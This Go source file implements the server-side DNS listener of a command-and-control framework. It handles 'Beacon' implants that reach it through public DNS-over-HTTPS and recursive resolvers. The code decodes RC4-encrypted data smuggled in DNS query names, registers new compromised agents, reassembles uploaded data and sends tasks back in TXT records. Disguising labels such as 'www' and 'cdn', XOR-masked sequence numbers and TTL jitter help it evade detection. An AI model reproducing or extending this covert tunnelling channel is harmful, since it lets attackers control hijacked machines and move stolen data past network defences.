package main

import (
	"bytes"
	"compress/zlib"
	"context"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"crypto/rc4"

	dns "github.com/miekg/dns"
)

// dohDebug controls verbose logging for the DoH-aware DNS listener.
// It is enabled by default while we stabilise the new behaviour behind
// public DoH resolvers. You can turn it off for production if needed.
const dohDebug = true

type dohFragBuf struct {
	total  uint32
	buf    []byte
	filled uint32
}

type dohDownBuf struct {
	total uint32
	off   uint32
	buf   []byte
}

// DoHListener is a DNS authority-style listener that is designed to sit
// behind public DoH / recursive resolvers. From the outside, it looks
// like a normal authoritative DNS server on UDP/TCP (HostBind:PortBind).
// From the Beacon's point of view, traffic goes through public DoH,
// recursive resolvers, and finally reaches this listener as plain DNS.
type DoHListener struct {
	Config DoHConfig
	Name   string
	Active bool

	udpServer *dns.Server
	tcpServer *dns.Server
	ts        Teamserver

	mu        sync.Mutex
	upFrags   map[string]*dohFragBuf
	downFrags map[string]*dohDownBuf
}

func (d *DoHListener) Start(ts Teamserver) error {
	if d.Config.TTL <= 0 {
		d.Config.TTL = 10
	}
	if d.Config.PktSize <= 0 || d.Config.PktSize > 64000 {
		d.Config.PktSize = 1024
	}

	// Seed the random number generator for TTL jitter
	rand.Seed(time.Now().UnixNano())

	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))

	mux := dns.NewServeMux()
	mux.HandleFunc(".", d.handleDNS)

	d.udpServer = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
	d.tcpServer = &dns.Server{Addr: addr, Net: "tcp", Handler: mux}
	d.ts = ts
	d.upFrags = make(map[string]*dohFragBuf)
	d.downFrags = make(map[string]*dohDownBuf)

	go func() {
		if err := d.udpServer.ListenAndServe(); err != nil {
			if dohDebug {
				fmt.Printf("[BeaconDoH-DNS] UDP listener error: %v\n", err)
			}
		}
	}()

	go func() {
		if err := d.tcpServer.ListenAndServe(); err != nil {
			if dohDebug {
				fmt.Printf("[BeaconDoH-DNS] TCP listener error: %v\n", err)
			}
		}
	}()

	time.Sleep(200 * time.Millisecond)
	d.Active = true
	return nil
}

func (d *DoHListener) Stop() error {
	d.Active = false
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	var err error
	if d.udpServer != nil {
		if e := d.udpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	if d.tcpServer != nil {
		if e := d.tcpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	return err
}

func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
	if sid == "" || len(data) == 0 {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}
	if len(data) <= 8 {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}

	total := binary.BigEndian.Uint32(data[0:4])
	offset := binary.BigEndian.Uint32(data[4:8])
	chunk := data[8:]

	const maxUploadSize = 4 << 20 // 4MB 上行限制
	if total == 0 || total > maxUploadSize {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}

	if offset == 0 && total <= uint32(len(chunk)) {
		_ = d.ts.TsAgentProcessData(sid, chunk)
		return
	}

	key := sid

	d.mu.Lock()
	defer d.mu.Unlock()

	fb, ok := d.upFrags[key]
	if !ok {
		buf := make([]byte, total)
		fb = &dohFragBuf{total: total, buf: buf}
		d.upFrags[key] = fb
	}
	if offset >= fb.total {
		return
	}
	end := offset + uint32(len(chunk))
	if end > fb.total {
		end = fb.total
	}
	n := end - offset
	copy(fb.buf[offset:end], chunk[:n])
	fb.filled += n

	if dohDebug {
		fmt.Printf("[BeaconDoH-DNS] [FRAG] Reassembling sid=%s | Got %d bytes (Offset: %d / Total: %d) | Progress: %d%%\n",
			sid, n, offset, fb.total, (fb.filled*100)/fb.total)
	}

	if fb.filled >= fb.total {
		if dohDebug {
			fmt.Printf("[BeaconDoH-DNS] [UP] Reassembly Complete! sid=%s | Total: %d bytes\n", sid, fb.total)
		}
		_ = d.ts.TsAgentProcessData(sid, fb.buf)
		delete(d.upFrags, key)
	}
}

// 协议约定（与 DNS Beacon 保持一致）：
// qname = <sid>.<op>.<seq>.<idx>.<data>.<...>.domain
// 其中 data = base32(no padding, upper) 的 RC4(payload)
// sid 建议为 8 字节 ID 的 16 位 hex 字符串，op = HI/PUT/GET
func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	// TTL with jitter
	baseTTL := uint32(d.Config.TTL)
	if baseTTL == 0 {
		baseTTL = 10
	}
	ttl := baseTTL + uint32(rand.Intn(60))

	// 记录请求的 Qtype，用于区分 A 心跳和 TXT 下行
	reqQType := dns.TypeTXT
	if len(r.Question) > 0 {
		reqQType = r.Question[0].Qtype
	}

	// 预先解析 EDNS0，用于后面动态调整 UDP 下行分片
	opt := r.IsEdns0()
	var udpSize int
	if opt != nil {
		udpSize = int(opt.UDPSize())
	}

	for _, q := range r.Question {
		labels := dns.SplitDomainName(q.Name)
		base := labels

		if d.Config.Domain != "" {
			dom := strings.TrimSuffix(strings.ToLower(d.Config.Domain), ".")
			for i := range labels {
				tail := strings.ToLower(strings.Join(labels[i:], "."))
				if tail == dom {
					base = labels[:i]
					break
				}
			}
		}

		var sid, op string
		var seq, idx int
		var dataB []byte

		if len(base) >= 5 {
			sid = base[0]
			rawOp := strings.ToLower(base[1])
			switch rawOp {
			case "www", "hi":
				op = "HI"
			case "cdn", "put":
				op = "PUT"
			case "api", "get":
				op = "GET"
			default:
				op = ""
			}

			if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
				seq = int(v ^ 0x39913991)
			}
			if v, err := strconv.ParseUint(base[3], 16, 32); err == nil {
				idx = int(v ^ 0x39913991)
			}

			_ = seq
			_ = idx

			dataLabel := strings.Join(base[4:], "")
			enc := base32.StdEncoding.WithPadding(base32.NoPadding)
			dataLabel = strings.ToUpper(dataLabel)
			if db, err := enc.DecodeString(dataLabel); err == nil {
				dataB = db
			}
		}

		// basic anti-abuse validation: sid must be 8-char hex
		if sid != "" {
			validSid := len(sid) == 8
			if validSid {
				for i := 0; i < 8; i++ {
					c := sid[i]
					if !(c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F') {
						validSid = false
						break
					}
				}
			}
			if !validSid {
				op = ""
			}
		}

		maxPayload := d.Config.PktSize * 4
		if maxPayload <= 0 {
			maxPayload = 4096
		}
		if len(dataB) > maxPayload {
			dataB = nil
		}

		if dohDebug {
			remote := ""
			if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
				remote = addr.IP.String()
			}

			logPrefix := "[???]"
			logDetails := ""

			if op == "HI" {
				logPrefix = "[HI]"
				logDetails = fmt.Sprintf("New Session Init (len=%d)", len(dataB))
			} else if op == "PUT" {
				logPrefix = "[UP]"
				logDetails = fmt.Sprintf("Data Upload (len=%d)", len(dataB))
			} else if op == "GET" {
				if reqQType == dns.TypeA {
					logPrefix = "[HB]"
					logDetails = "Keep-Alive (A)"
				} else {
					logPrefix = "[DOWN]"
					logDetails = "Data Poll (TXT)"
				}
			}

			if sid != "" {
				fmt.Printf("[BeaconDoH-DNS] %s %s | sid=%s seq=%d idx=%d | src=%s\n",
					logPrefix, logDetails, sid, seq, idx, remote)
			}
		}

		switch op {
		case "HI", "PUT":
			if len(dataB) > 0 {
				if op == "HI" {
					keyBytes, _ := hex.DecodeString(d.Config.EncryptKey)
					if len(keyBytes) == 16 && len(dataB) >= 8 {
						if c, e := rc4.NewCipher(keyBytes); e == nil {
							fullBeat := make([]byte, len(dataB))
							c.XORKeyStream(fullBeat, dataB)
							if len(fullBeat) >= 8 {
								agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[:4]))
								agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[4:8]))
								beat := fullBeat[8:]
								if !d.ts.TsAgentIsExists(agentId) {
									externalIP := ""
									if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
										externalIP = addr.IP.String()
									}
									if dohDebug {
										fmt.Printf("[BeaconDoH-DNS] HI create agent type=%s id=%s ip=%s\n", agentType, agentId, externalIP)
									}
									_, _ = d.ts.TsAgentCreate(agentType, agentId, beat, d.Name, externalIP, true)
								}
								_ = d.ts.TsAgentSetTick(agentId)
							}
						}
					}
				}
				if op == "PUT" {
					if dohDebug {
						fmt.Printf("[BeaconDoH-DNS] %s payload len=%d sid=%s\n", op, len(dataB), sid)
					}
					d.handlePutFragment(sid, seq, dataB)
					if sid != "" {
						_ = d.ts.TsAgentSetTick(sid)
					}
				}
			}

			// ACK：根据 QType 返回最小响应
			if reqQType == dns.TypeA {
				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("127.0.0.1").To4()}
				m.Answer = append(m.Answer, rr)
			} else if reqQType == dns.TypeAAAA {
				rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::1").To16()}
				m.Answer = append(m.Answer, rr)
			} else {
				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
				m.Answer = append(m.Answer, rr)
			}

		case "GET":
			if sid != "" {
				_ = d.ts.TsAgentSetTick(sid)
			}

			var df *dohDownBuf
			if sid != "" {
				d.mu.Lock()
				if buf, ok := d.downFrags[sid]; ok {
					df = buf
				}
				d.mu.Unlock()

				if df == nil || df.off >= df.total {
					maxDataSize := d.Config.PktSize * 256
					if maxDataSize <= 0 || maxDataSize > (4<<20) {
						maxDataSize = 4 << 20
					}
					if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil && len(p) > 0 {
						if dohDebug {
							fmt.Printf("[BeaconDoH-DNS] GET tasks sid=%s total=%d\n", sid, len(p))
						}
						origLen := len(p)
						flags := byte(0)
						payload := p

						const minCompressSize = 2048
						if origLen > minCompressSize {
							var zbuf bytes.Buffer
							wz, errW := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
							if errW == nil {
								if _, errC := wz.Write(p); errC == nil && wz.Close() == nil {
									comp := zbuf.Bytes()
									if len(comp) > 0 && len(comp) < origLen {
										payload = comp
										flags = 1
									}
								} else {
									_ = wz.Close()
								}
							}
						}

						totalLen := 1 + 4 + len(payload)
						buf := make([]byte, totalLen)
						buf[0] = flags
						buf[1] = byte(origLen & 0xFF)
						buf[2] = byte((origLen >> 8) & 0xFF)
						buf[3] = byte((origLen >> 16) & 0xFF)
						buf[4] = byte((origLen >> 24) & 0xFF)
						copy(buf[5:], payload)
						df = &dohDownBuf{total: uint32(len(buf)), off: 0, buf: buf}

						d.mu.Lock()
						d.downFrags[sid] = df
						d.mu.Unlock()
					}
				}
			}

			var frame []byte

			if reqQType == dns.TypeA {
				d.mu.Lock()
				if oldDf, ok := d.downFrags[sid]; ok && oldDf.off >= oldDf.total {
					delete(d.downFrags, sid)
					if dohDebug {
						fmt.Printf("[BeaconDoH-DNS] [ACK] Task confirmed by A-Record | sid=%s\n", sid)
					}
				}
				d.mu.Unlock()

				hasTasks := (df != nil && df.off < df.total)
				if hasTasks {
					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.1").To4()}
					m.Answer = append(m.Answer, rr)
				} else {
					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
					m.Answer = append(m.Answer, rr)
				}
			} else {
				if df != nil {
					if df.off >= df.total {
						if dohDebug {
							fmt.Printf("[BeaconDoH-DNS] [RETRY] Agent requested data again | sid=%s | Resending from offset 0\n", sid)
						}
						df.off = 0
					}

					if df.off < df.total {
						maxChunk := d.Config.PktSize
						isTCP := w.RemoteAddr().Network() == "tcp"

						if !isTCP {
							// 基于 EDNS0 的 UDP 下行分片大小估算
							if udpSize <= 0 {
								udpSize = 1232
							}
							maxTextBytes := udpSize - 300
							if maxTextBytes < 512 {
								maxTextBytes = 512
							}
							maxChunkByEDNS := (maxTextBytes * 3 / 4) - 8
							if maxChunkByEDNS < 180 {
								maxChunkByEDNS = 180
							}
							if maxChunk <= 0 || maxChunk > maxChunkByEDNS {
								maxChunk = maxChunkByEDNS
							}
							if maxChunk > 4096 {
								maxChunk = 4096
							}
						} else {
							if maxChunk <= 0 {
								maxChunk = 4096
							}
						}

						remaining := df.total - df.off
						chunkLen := remaining
						if chunkLen > uint32(maxChunk) {
							chunkLen = uint32(maxChunk)
						}

						frame = make([]byte, 8+chunkLen)
						binary.BigEndian.PutUint32(frame[0:4], df.total)
						binary.BigEndian.PutUint32(frame[4:8], df.off)
						copy(frame[8:], df.buf[df.off:df.off+chunkLen])

						if dohDebug {
							fmt.Printf("[BeaconDoH-DNS] [DOWN] Sending Fragment | sid=%s | %d bytes (Offset: %d / Total: %d) | TCP: %v\n",
								sid, chunkLen, df.off, df.total, isTCP)
						}

						df.off += chunkLen
					}
				}

				if len(frame) == 0 {
					if reqQType == dns.TypeA {
						rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
						m.Answer = append(m.Answer, rr)
					} else if reqQType == dns.TypeAAAA {
						rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::").To16()}
						m.Answer = append(m.Answer, rr)
					} else {
						rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{""}}
						m.Answer = append(m.Answer, rr)
					}
				} else {
					if reqQType != dns.TypeTXT {
						// 目前只在 TXT 中承载下行数据
					} else {
						b64Str := base64.StdEncoding.EncodeToString(frame)
						var chunks []string
						for len(b64Str) > 255 {
							chunks = append(chunks, b64Str[:255])
							b64Str = b64Str[255:]
						}
						chunks = append(chunks, b64Str)

						rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: chunks}
						m.Answer = append(m.Answer, rr)
					}
				}
			}

		default:
			rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
			m.Answer = append(m.Answer, rr)
		}
	}

	_ = w.WriteMsg(m)
}
